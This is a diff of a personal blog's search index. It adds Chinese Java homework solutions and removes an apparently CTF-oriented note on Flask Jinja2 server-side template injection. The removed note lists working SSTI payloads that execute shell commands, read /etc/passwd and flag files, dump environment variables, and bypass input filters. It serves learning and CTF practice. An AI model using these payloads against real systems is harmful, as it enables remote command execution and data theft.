@@ -1,6 +1,109 @@
 <?xml version="1.0" encoding="utf-8"?>
 <search>
   <entry>
+    <title>Java 作业 02</title>
+    <url>/2024/04/05/Java%20%E4%BD%9C%E4%B8%9A%202/</url>
+    <content><![CDATA[<h1 id="7-1-jmu-Java-01入门-第一个PTA上Java程序"><a href="#7-1-jmu-Java-01入门-第一个PTA上Java程序" class="headerlink" title="7-1 jmu-Java-01入门-第一个PTA上Java程序"></a>7-1 jmu-Java-01入门-第一个PTA上Java程序</h1><p>本题目要求读入若干对整数a和b，然后输出它们的和。</p>
+<h3 id="输入格式"><a href="#输入格式" class="headerlink" title="输入格式:"></a>输入格式:</h3><p>在一行中给出一对整数a和b。<br>以下输入样例只有两对，实际测试数据可能有多对值。</p>
+<h3 id="输出格式"><a href="#输出格式" class="headerlink" title="输出格式:"></a>输出格式:</h3><p>对每一组输入，如果a的绝对值&gt;1000，输出<code>|a|&gt;1000</code>，否则输出<code>a+b</code>的值。</p>
+<h3 id="输入样例"><a href="#输入样例" class="headerlink" title="输入样例:"></a>输入样例:</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">18 -299</span><br><span class="line">1001 -9</span><br><span class="line">-1001 8</span><br></pre></td></tr></table></figure>
+
+<h3 id="输出样例"><a href="#输出样例" class="headerlink" title="输出样例:"></a>输出样例:</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">-281</span><br><span class="line">|a|&gt;1000</span><br><span class="line">|a|&gt;1000</span><br></pre></td></tr></table></figure>
+
+<h2 id="payload"><a href="#payload" class="headerlink" title="payload"></a>payload</h2><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> java.util.Scanner;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Main</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="type">Scanner</span> <span class="variable">scanner</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Scanner</span>(System.in);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">while</span> (scanner.hasNextInt()) &#123;</span><br><span class="line">            <span class="type">int</span> <span class="variable">a</span> <span class="operator">=</span> scanner.nextInt();</span><br><span class="line">            <span class="type">int</span> <span class="variable">b</span> <span class="operator">=</span> scanner.nextInt();</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (Math.abs(a) &gt; <span class="number">1000</span>) &#123;</span><br><span class="line">                System.out.println(<span class="string">&quot;|a|&gt;1000&quot;</span>);</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                System.out.println(a + b);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        scanner.close();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>以下是对</p>
+<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">while</span> (scanner.hasNextInt()) &#123;</span><br><span class="line">	<span class="type">int</span> <span class="variable">a</span> <span class="operator">=</span> scanner.nextInt();</span><br><span class="line">	<span class="type">int</span> <span class="variable">b</span> <span class="operator">=</span> scanner.nextInt();</span><br><span class="line">    ...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>代码块的解释：</p>
+<ul>
+<li><code>while (scanner.hasNextInt())</code>: 这是一个循环，会一直执行，直到没有更多的整数可以从输入中读取。<code>scanner.hasNextInt()</code> 是一个检查，用于确定扫描器的下一个输入是否可以解释为一个整数。如果有可读取的整数，它返回 <code>true</code>，循环继续；否则返回 <code>false</code>，循环结束。</li>
+<li><code>int a = scanner.nextInt();</code>: 如果 <code>hasNextInt()</code> 返回 <code>true</code>，则通过 <code>nextInt()</code> 方法读取下一个整数，并将其赋值给变量 <code>a</code>。<code>nextInt()</code> 方法从输入中读取下一个整数，然后将其从输入流中消耗掉，意味着这个整数在之后的操作中不再可用。</li>
+<li><code>int b = scanner.nextInt();</code>: 在读取了 <code>a</code> 之后，程序继续读取下一个整数，并将其赋值给变量 <code>b</code>。同样，这是通过 <code>nextInt()</code> 方法实现的。</li>
+</ul>
+<h1 id="7-2-jmu-Java-01入门-取数字浮点数"><a href="#7-2-jmu-Java-01入门-取数字浮点数" class="headerlink" title="7-2 jmu-Java-01入门-取数字浮点数"></a>7-2 jmu-Java-01入门-取数字浮点数</h1><p>本题目要求读入若干以回车结束的字符串表示的整数或者浮点数，然后将每个数中的所有数字全部加总求和。</p>
+<h3 id="输入格式-1"><a href="#输入格式-1" class="headerlink" title="输入格式:"></a>输入格式:</h3><p>每行一个整数或者浮点数。保证在浮点数范围内。</p>
+<h3 id="输出格式-1"><a href="#输出格式-1" class="headerlink" title="输出格式:"></a>输出格式:</h3><p>整数或者浮点数中的数字之和。题目保证和在整型范围内。</p>
+<h3 id="输入样例-1"><a href="#输入样例-1" class="headerlink" title="输入样例:"></a>输入样例:</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">-123.01</span><br><span class="line">234</span><br></pre></td></tr></table></figure>
+
+<h3 id="输出样例-1"><a href="#输出样例-1" class="headerlink" title="输出样例:"></a>输出样例:</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">7</span><br><span class="line">9</span><br></pre></td></tr></table></figure>
+
+<h2 id="payload-1"><a href="#payload-1" class="headerlink" title="payload"></a>payload</h2><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> java.util.Scanner;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Main</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="type">Scanner</span> <span class="variable">scanner</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Scanner</span>(System.in);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">while</span> (scanner.hasNext()) &#123;</span><br><span class="line">            <span class="type">String</span> <span class="variable">input</span> <span class="operator">=</span> scanner.next();</span><br><span class="line">            <span class="type">int</span> <span class="variable">sum</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">for</span> (<span class="type">char</span> c : input.toCharArray()) &#123;</span><br><span class="line">                <span class="keyword">if</span> (Character.isDigit(c)) &#123;</span><br><span class="line">                    sum += c - <span class="string">&#x27;0&#x27;</span>;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            System.out.println(sum);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        scanner.close();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>以下是对</p>
+<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">for</span> (<span class="type">char</span> c : input.toCharArray()) &#123;</span><br><span class="line">	<span class="keyword">if</span> (Character.isDigit(c)) &#123;</span><br><span class="line">		sum += c - <span class="string">&#x27;0&#x27;</span>;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>代码块的解释：</p>
+<ul>
+<li><code>for (char c : input.toCharArray())</code>：这行代码将输入字符串转换成一个字符数组，并遍历每个字符。变量 <code>c</code> 代表循环中当前的字符。</li>
+<li><code>if (Character.isDigit(c))</code>：在循环内部，这行代码检查当前字符 <code>c</code> 是否是数字。<code>Character.isDigit(c)</code> 方法如果 <code>c</code> 是数字（0-9），则返回 <code>true</code>，否则返回 <code>false</code>。</li>
+<li><code>sum += c - &#39;0&#39;</code>：如果 <code>c</code> 是数字，就执行这行代码。它将字符 <code>c</code> 转换为其数值整数。由于 <code>c</code> 是代表数字的字符，从 <code>c</code> 中减去 <code>&#39;0&#39;</code> 就得到了那个数字的整数值。然后，这个整数值被加到 <code>sum</code> 上。</li>
+</ul>
+<p>例如，如果 <code>c</code> 是字符 <code>&#39;4&#39;</code>，<code>c - &#39;0&#39;</code> 将会是 <code>52 - 48</code>（在ASCII码中，’4’ 是 52，’0’ 是 48），等于 <code>4</code>。这个值然后被加到 <code>sum</code> 上，<code>sum</code> 累积了字符串中所有数字字符的总和。</p>
+<h1 id="7-3-jmu-Java-01入门-格式化输入输出与字符串"><a href="#7-3-jmu-Java-01入门-格式化输入输出与字符串" class="headerlink" title="7-3 jmu-Java-01入门-格式化输入输出与字符串"></a>7-3 jmu-Java-01入门-格式化输入输出与字符串</h1><h3 id="本题主要考察"><a href="#本题主要考察" class="headerlink" title="本题主要考察"></a>本题主要考察</h3><ul>
+<li>使用<code>Scanner</code>处理输入</li>
+<li>使用<code>System.out.printf</code>进行格式化输出</li>
+<li><code>String</code>常用方法与字符串常用操作</li>
+</ul>
+<h2 id="main"><a href="#main" class="headerlink" title="main"></a>main</h2><h3 id="输入说明："><a href="#输入说明：" class="headerlink" title="输入说明："></a>输入说明：</h3><ul>
+<li>输入<code>double</code>，然后输入3个浮点数。<strong>输出：</strong>从左到右依次输出3个double(均保留2位小数输出，宽度为5)，<strong>格式依次为：</strong>右侧填充空格，左侧填充空格，直接输出</li>
+<li>输入<code>int</code>，然后输入3个整数(以1个或多个空格分隔)。<strong>输出：</strong>将3个整数相加后输出。</li>
+<li>输入<code>str</code>，然后输入3个字符串。<strong>输出：</strong>去除空格，然后倒序输出3个字符。</li>
+<li>输入<code>line</code>，然后输入一行字符串。<strong>输出：</strong>转换成大写后输出。</li>
+<li>如果输入不是上面几个关键词，**输出:**输出**other**。</li>
+</ul>
+<h3 id="输出说明"><a href="#输出说明" class="headerlink" title="输出说明"></a>输出说明</h3><p><strong>choice&#x3D;你输入选项</strong><br>该选项对应的输出内容</p>
+<h3 id="提示"><a href="#提示" class="headerlink" title="提示"></a>提示</h3><ol>
+<li>可使用<code>line.split(&quot;\\s+&quot;);</code>将以1个或多个空格分隔开的字符串分割并放入字符串数组。</li>
+<li><code>Scanner.nextLine</code>与Scanner的其他next函数混用有可能出错。</li>
+</ol>
+<h3 id="输入样例-2"><a href="#输入样例-2" class="headerlink" title="输入样例:"></a>输入样例:</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">double</span><br><span class="line">1.578 3.0 3.14259</span><br><span class="line">line</span><br><span class="line">aaaaaaaaaa</span><br><span class="line">int</span><br><span class="line">1      2    3</span><br><span class="line">str</span><br><span class="line">321 654 987</span><br><span class="line">line</span><br><span class="line">dddddddddd</span><br><span class="line">end</span><br></pre></td></tr></table></figure>
+
+<h3 id="输出样例-2"><a href="#输出样例-2" class="headerlink" title="输出样例:"></a>输出样例:</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">choice=double</span><br><span class="line">1.58 , 3.00,3.14</span><br><span class="line">choice=line</span><br><span class="line">AAAAAAAAAA</span><br><span class="line">choice=int</span><br><span class="line">6</span><br><span class="line">choice=str</span><br><span class="line">987654321</span><br><span class="line">choice=line</span><br><span class="line">DDDDDDDDDD</span><br><span class="line">choice=end</span><br><span class="line">other</span><br></pre></td></tr></table></figure>
+
+<h2 id="payload-2"><a href="#payload-2" class="headerlink" title="payload"></a>payload</h2><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> java.util.Scanner;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Main</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="type">Scanner</span> <span class="variable">scanner</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Scanner</span>(System.in);</span><br><span class="line">        String choice;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">while</span> (scanner.hasNext()) &#123;</span><br><span class="line">            choice = scanner.next();</span><br><span class="line">            System.out.printf(<span class="string">&quot;choice=%s\n&quot;</span>, choice);</span><br><span class="line"></span><br><span class="line">            <span class="keyword">switch</span> (choice) &#123;</span><br><span class="line">                <span class="keyword">case</span> <span class="string">&quot;double&quot;</span>:</span><br><span class="line">                    <span class="type">double</span> <span class="variable">d1</span> <span class="operator">=</span> scanner.nextDouble();</span><br><span class="line">                    <span class="type">double</span> <span class="variable">d2</span> <span class="operator">=</span> scanner.nextDouble();</span><br><span class="line">                    <span class="type">double</span> <span class="variable">d3</span> <span class="operator">=</span> scanner.nextDouble();</span><br><span class="line">                    System.out.printf(<span class="string">&quot;%-5.2f,%5.2f,%.2f\n&quot;</span>, d1, d2, d3);</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                <span class="keyword">case</span> <span class="string">&quot;int&quot;</span>:</span><br><span class="line">                    <span class="type">int</span> <span class="variable">i1</span> <span class="operator">=</span> scanner.nextInt();</span><br><span class="line">                    <span class="type">int</span> <span class="variable">i2</span> <span class="operator">=</span> scanner.nextInt();</span><br><span class="line">                    <span class="type">int</span> <span class="variable">i3</span> <span class="operator">=</span> scanner.nextInt();</span><br><span class="line">                    System.out.println(i1 + i2 + i3);</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                <span class="keyword">case</span> <span class="string">&quot;str&quot;</span>:</span><br><span class="line">                    scanner.nextLine();</span><br><span class="line">                    <span class="type">String</span> <span class="variable">str</span> <span class="operator">=</span> scanner.nextLine();</span><br><span class="line">                    String[] arr = str.split(<span class="string">&quot;\\s+&quot;</span>);</span><br><span class="line">                    <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">2</span>; i &gt;= <span class="number">0</span>; i--) &#123;</span><br><span class="line">                        System.out.print(arr[i]);</span><br><span class="line">                    &#125;</span><br><span class="line">                    System.out.println();</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                <span class="keyword">case</span> <span class="string">&quot;line&quot;</span>:</span><br><span class="line">                    scanner.nextLine();</span><br><span class="line">                    <span class="type">String</span> <span class="variable">line</span> <span class="operator">=</span> scanner.nextLine();</span><br><span class="line">                    System.out.println(line.toUpperCase());</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                <span class="keyword">default</span>:</span><br><span class="line">                    System.out.println(<span class="string">&quot;other&quot;</span>);</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        scanner.close();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>解释：</p>
+<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">System.out.printf(<span class="string">&quot;%-5.2f,%5.2f,%.2f\n&quot;</span>, d1, d2, d3);</span><br></pre></td></tr></table></figure>
+
+<p><code>%-5.2f</code>：这部分指定了输出宽度和对齐方式。<code>-</code> 表示左对齐，而 5 指定了最小输出宽度为 5 个字符。这意味着如果数值转换成的字符串长度小于5个字符，输出将通过添加空格到右侧来扩展到5个字符，从而保持左对齐。如果没有-，数字默认是右对齐的。</p>
+<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">String[] arr = str.split(<span class="string">&quot;\\s+&quot;</span>);</span><br></pre></td></tr></table></figure>
+
+<p><code>String[] arr = str.split(&quot;\\s+&quot;);</code> 这行代码是用来将字符串 <code>str</code> 分割成字符串数组 <code>arr</code> 的。这里具体的分割依据是正则表达式 <code>\\s+</code>。</p>
+<p>解析这个正则表达式：</p>
+<ul>
+<li><code>\\s</code> 代表空白字符，比如空格、制表符（Tab）、换行符等。</li>
+<li><code>+</code> 表示前面的字符（在这里是指空白字符）出现一次或多次。</li>
+</ul>
+<p>综合来看，<code>\\s+</code> 匹配一连串（一个或多个连续的）空白字符。因此，这个命令会根据一个或多个连续的空白字符来分割字符串 <code>str</code>，并将分割后的结果存储在字符串数组 <code>arr</code> 中。</p>
+<p>例如，如果 <code>str</code> 是 <code>&quot;hello world java programming&quot;</code>，那么执行这行代码后，<code>arr</code> 将会是一个包含四个元素的数组，分别是 <code>&quot;hello&quot;</code>, <code>&quot;world&quot;</code>, <code>&quot;java&quot;</code>, 和 <code>&quot;programming&quot;</code>。这是因为原始的字符串 <code>str</code> 被空格（它是一种空白字符）分割成了四部分。</p>
+<h1 id="7-4-jmu-Java-01入门-开根号"><a href="#7-4-jmu-Java-01入门-开根号" class="headerlink" title="7-4 jmu-Java-01入门-开根号"></a>7-4 jmu-Java-01入门-开根号</h1><p>使用逐步逼近法对给定数值x求开根号。</p>
+<p><strong>逐步逼近法说明</strong>：从0开始逐步累加步长值。</p>
+<p>步长&#x3D;0.0001，epsilon(误差)&#x3D;0.0001</p>
+<p><strong>循环继续的条件：</strong></p>
+<p><code>平方值&lt;x</code> 且 <code>|x-平方值| &gt; epsilon</code></p>
+<h3 id="说明与参考"><a href="#说明与参考" class="headerlink" title="说明与参考"></a>说明与参考</h3><ol>
+<li>数值输出保留6位小数，使用System.out.printf(“%.6f\n”)</li>
+<li>求平方，参考Math.pow函数。</li>
+<li>输入值&lt;0时，返回<strong>Double.NaN</strong></li>
+</ol>
+<h3 id="输入格式-2"><a href="#输入格式-2" class="headerlink" title="输入格式:"></a>输入格式:</h3><p>任意数值</p>
+<h3 id="输出格式-2"><a href="#输出格式-2" class="headerlink" title="输出格式:"></a>输出格式:</h3><p>对每一组输入，在一行中输出其开根号。保留6位小数</p>
+<h3 id="输入样例-3"><a href="#输入样例-3" class="headerlink" title="输入样例:"></a>输入样例:</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">解释-1</span><br><span class="line">0</span><br><span class="line">0.5</span><br><span class="line">0.36</span><br><span class="line">1</span><br><span class="line">6</span><br><span class="line">100</span><br><span class="line">131</span><br></pre></td></tr></table></figure>
+
+<h3 id="输出样例-3"><a href="#输出样例-3" class="headerlink" title="输出样例:"></a>输出样例:</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">解释NaN</span><br><span class="line">0.000000</span><br><span class="line">0.707100</span><br><span class="line">0.600000</span><br><span class="line">1.000000</span><br><span class="line">2.449500</span><br><span class="line">10.000000</span><br><span class="line">11.445600</span><br></pre></td></tr></table></figure>
+
+<h2 id="payload-3"><a href="#payload-3" class="headerlink" title="payload"></a>payload</h2><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> java.util.*;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Main</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="type">Scanner</span> <span class="variable">in</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Scanner</span>(System.in);</span><br><span class="line">        <span class="keyword">while</span> (in.hasNext())&#123;</span><br><span class="line">            <span class="type">double</span> k=in.nextDouble();</span><br><span class="line">            <span class="keyword">if</span> (k&gt;<span class="number">0</span>) &#123;</span><br><span class="line">                <span class="type">double</span> m=<span class="number">0</span>;</span><br><span class="line">                <span class="keyword">while</span> (m*m&lt;k&amp;&amp;Math.abs(k-m*m)&gt;<span class="number">0.0001</span>) &#123;</span><br><span class="line">                    m+=<span class="number">0.0001</span>;</span><br><span class="line">                &#125;</span><br><span class="line">                System.out.printf(<span class="string">&quot;%.6f\n&quot;</span>,m);</span><br><span class="line">            &#125;<span class="keyword">else</span> <span class="keyword">if</span> (k==<span class="number">0</span>)&#123;</span><br><span class="line">                System.out.printf(<span class="string">&quot;%.6f\n&quot;</span>,<span class="number">0.0</span>);</span><br><span class="line">            &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                System.out.print(<span class="string">&quot;NaN\n&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+]]></content>
+      <categories>
+        <category>Java</category>
+      </categories>
+      <tags>
+        <tag>Java</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>HTML CSS 学习记录</title>
     <url>/2024/04/04/HTML%20CSS%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/</url>
     <content><![CDATA[<h1 id="HTML"><a href="#HTML" class="headerlink" title="HTML"></a>HTML</h1><h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><p>HTML 是用来描述网页的一种语言。</p>
@@ -504,101 +607,6 @@
       <tags>
         <tag>HTML</tag>
         <tag>CSS</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>Flask Jinja2 SSTI学习记录</title>
-    <url>/2024/03/09/Jinja2%20SSTI/</url>
-    <content><![CDATA[<h1 id="Flask-Jinja2"><a href="#Flask-Jinja2" class="headerlink" title="Flask Jinja2"></a>Flask Jinja2</h1><p>flask是使用Jinja2来作为渲染引擎的，模板文件并不是单纯的html代码，而是夹杂着模板的语法，因</p>
-<p>为页面不可能都是一个样子的，有一些地方是会变化的。比如说显示用户名的地方，这个时候就需要使用模板支持的语法，来传参。</p>
-<p>flask的渲染方法有render_template和render_template_string两种。</p>
-<p>感觉…没什么好多说的，就是记模板</p>
-<span id="more"></span>
-
-<h2 id="模板和过滤（前提：以GET给name传参）"><a href="#模板和过滤（前提：以GET给name传参）" class="headerlink" title="模板和过滤（前提：以GET给name传参）"></a>模板和过滤（前提：以GET给name传参）</h2><h3 id="通用（并不是每一个题目都有以下几类）"><a href="#通用（并不是每一个题目都有以下几类）" class="headerlink" title="通用（并不是每一个题目都有以下几类）"></a>通用（并不是每一个题目都有以下几类）</h3><h4 id=""><a href="#" class="headerlink" title="&lt;class os.wrap_close&gt;"></a><code>&lt;class os.wrap_close&gt;</code></h4><h5 id="popen"><a href="#popen" class="headerlink" title="popen"></a><code>popen</code></h5><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?name=&#123;&#123;&quot;&quot;.__class__.__bases__[0].__subclasses__()[138].__init__.__globals__[&quot;popen&quot;](&quot;ls /&quot;).read()&#125;&#125;</span><br></pre></td></tr></table></figure>
-
-<p>讲述一些小细节：</p>
-<ul>
-<li><p><code>__bases__</code>后面的数字是根据实际情况，以<strong>object</strong>类出现的位数而定的（一般是<code>__bases__</code>为0，<code>__mro__</code>为1）</p>
-</li>
-<li><p><code>__subclasses__</code>后面的数字是根据实际情况，以<strong>os.wrap_close</strong>出现的位数而定的</p>
-</li>
-</ul>
-<p>直接读文件</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?name=&#123;&#123;&#x27;&#x27;.__class__.__mro__[1].__subclasses__()[138].__init__.__globals__.get(&#x27;popen&#x27;)(&#x27;dir&#x27;).read()&#125;&#125;</span><br></pre></td></tr></table></figure>
-
-<h5 id="builtins"><a href="#builtins" class="headerlink" title="__builtins__"></a><code>__builtins__</code></h5><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?name=&#123;&#123;&quot;&quot;.__class__.__bases__.__subclasses__()[138].__init__.__globals__[&#x27;__builtins__&#x27;][&#x27;eval&#x27;](&quot;__import__(&#x27;os&#x27;).popen(&#x27;ls /&#x27;).read()&quot;)&#125;&#125;</span><br></pre></td></tr></table></figure>
-
-<p>这个类有个<strong>eval</strong>内置方法就可以执行命令</p>
-<p>这里有个坑，就是在执行命令的时候不能用<strong>system</strong>函数</p>
-<p>因为在flask里面执行system的时候返回的是状态码，也就是看不到回显，只会回显一些数字，所以要用popen，而且最好16进制编码一下，不然容易触发黑名单，还能避免很多大大小小的错误</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?name=&#123;&#123;&#x27;&#x27;.__class__.__mro__.__getitem__(1).__subclasses__().__getitem__(138).__init__.__globals__.get(&#x27;__builtins__&#x27;).get(&#x27;open&#x27;)(&#x27;dir&#x27;).read()&#125;&#125;</span><br><span class="line">//get()方式绕过</span><br></pre></td></tr></table></figure>
-
-<h5 id="sys"><a href="#sys" class="headerlink" title="sys"></a><code>sys</code></h5><p>听说有用，目前还没见到</p>
-<h4 id="-1"><a href="#-1" class="headerlink" title="&lt;type &#39;file&#39;&gt; "></a><code>&lt;type &#39;file&#39;&gt; </code></h4><p>读取文件类，&lt;type ‘file’&gt; file位置一般为40，直接调用</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?name=&#123;&#123;&#x27;&#x27;.__class__.__base__.__subclasses__()[40](&#x27;fl4g&#x27;).read()&#125;&#125;</span><br></pre></td></tr></table></figure>
-
-<h4 id="-2"><a href="#-2" class="headerlink" title="&lt;class &#39;site._Printer&#39;&gt;"></a><code>&lt;class &#39;site._Printer&#39;&gt;</code></h4><p>调用<code>os</code>的<code>popen</code>执行命令</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?name=&#123;&#123;&#x27;&#x27;.__class__.__base__.__subclasses__()[71].__init__[&#x27;__glo&#x27;+&#x27;bals__&#x27;][&#x27;os&#x27;].popen(&#x27;ls /&#x27;).read()&#125;&#125;</span><br><span class="line">?name=&#123;&#123;&#x27;&#x27;.__class__.__base__.__subclasses__()[71].__init__[&#x27;__glo&#x27;+&#x27;bals__&#x27;][&#x27;os&#x27;].popen(&#x27;ls /flasklight&#x27;).read()&#125;&#125;</span><br><span class="line">?name=&#123;&#123;&#x27;&#x27;.__class__.__base__.__subclasses__()[71].__init__[&#x27;__glo&#x27;+&#x27;bals__&#x27;][&#x27;os&#x27;].popen(&#x27;cat coomme_geeeett_youur_flek&#x27;).read()&#125;&#125;</span><br></pre></td></tr></table></figure>
-
-<p>如果system被过滤，用os的listdir读取目录+file模块读取文件：</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?name=&#123;&#123;&#x27;&#x27;.__class__.__base__.__subclasses__()[71].__init__.__globals__[&#x27;os&#x27;].listdir(&#x27;.&#x27;)&#125;&#125;</span><br></pre></td></tr></table></figure>
-
-<h4 id="-3"><a href="#-3" class="headerlink" title="&lt;class &#39;subprocess.Popen&#39;&gt;"></a><code>&lt;class &#39;subprocess.Popen&#39;&gt;</code></h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?name=&#123;&#123;&#x27;&#x27;.__class__.__base__.__subclasses__()[258](&#x27;ls&#x27;,shell=True,stdout=-1).communicate()[0].strip()&#125;&#125;</span><br><span class="line">?name=&#123;&#123;&#x27;&#x27;.__class__.__base__.__subclasses__()[258](&#x27;ls /flasklight&#x27;,shell=True,stdout=-1).communicate()[0].strip()&#125;&#125;</span><br><span class="line">?name=&#123;&#123;&#x27;&#x27;.__class__.__base__.__subclasses__()[258](&#x27;cat /flasklight/coomme_geeeett_youur_flek&#x27;,shell=True,stdout=-1).communicate()[0].strip()&#125;&#125;</span><br><span class="line">//读环境变量</span><br><span class="line">?name=&#123;&#123;&#x27;&#x27;.__class__.__base__.__subclasses__()[245](&#x27;env&#x27;,shell=True,stdout=-1).communicate()[0].strip()&#125;&#125;</span><br></pre></td></tr></table></figure>
-
-<h4 id="-4"><a href="#-4" class="headerlink" title="&lt;class &#39;warnings.catch_warnings&#39;&gt;"></a><code>&lt;class &#39;warnings.catch_warnings&#39;&gt;</code></h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#调用file</span><br><span class="line">?name=&#123;&#123;&#x27;&#x27;.__class__.__base__.__subclasses__()[59].__init__.__globals__[&#x27;__builtins__&#x27;][&#x27;file&#x27;](&#x27;/etc/passwd&#x27;).read()&#125;&#125;</span><br><span class="line">#把 read() 改为 write() 就是写文件</span><br><span class="line">#调用eval</span><br><span class="line">?name=&#123;&#123;&#x27;&#x27;.__class__.__base__.__subclasses__()[59].__init__[&#x27;__glo&#x27;+&#x27;bals__&#x27;][&#x27;__builtins__&#x27;][&#x27;eval&#x27;](&quot;__import__(&#x27;os&#x27;).popen(&#x27;ls /&#x27;).read()&quot;)&#125;&#125;</span><br><span class="line">#调用system方法</span><br><span class="line">?name=&#123;&#123;&#x27;&#x27;.__class__.__base__.__subclasses__()[59].__init__.__globals__[&#x27;linecache&#x27;].__dict__.values()[12].__dict__.values()[144](&#x27;whoami&#x27;)&#125;&#125;</span><br><span class="line">#调用commands进行命令执行</span><br><span class="line">?name=&#123;&#123;&#x27;&#x27;.__class__.__bases__.__subclasses__()[59].__init__.__globals__[&#x27;__builtins__&#x27;][&#x27;__import__&#x27;](&#x27;commands&#x27;).getstatusoutput(&#x27;ls /&#x27;)&#125;&#125;</span><br></pre></td></tr></table></figure>
-
-<h3 id="扩展"><a href="#扩展" class="headerlink" title="扩展"></a>扩展</h3><h4 id="过滤"><a href="#过滤" class="headerlink" title="过滤_"></a>过滤<code>_</code></h4><h5 id="引号内十六进制绕过"><a href="#引号内十六进制绕过" class="headerlink" title="引号内十六进制绕过"></a>引号内十六进制绕过</h5><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#123;&#123;&quot;&quot;.__class__ &#125;&#125;</span><br><span class="line">&#123;&#123;&quot;&quot;.&quot;\x5f\x5fclass\x5f\x5f&quot; &#125;&#125;</span><br></pre></td></tr></table></figure>
-
-<p><code>_</code>是<code>\x5f</code>，<code>.</code>是<code>\x2E</code></p>
-<h4 id="过滤-1"><a href="#过滤-1" class="headerlink" title="过滤[]"></a>过滤<code>[]</code></h4><h5 id="getitem"><a href="#getitem" class="headerlink" title="__getitem__()"></a><code>__getitem__()</code></h5><p><code>d[&#39;a&#39;]</code> 等价于<code>d.__getitem__(&#39;a&#39;)</code></p>
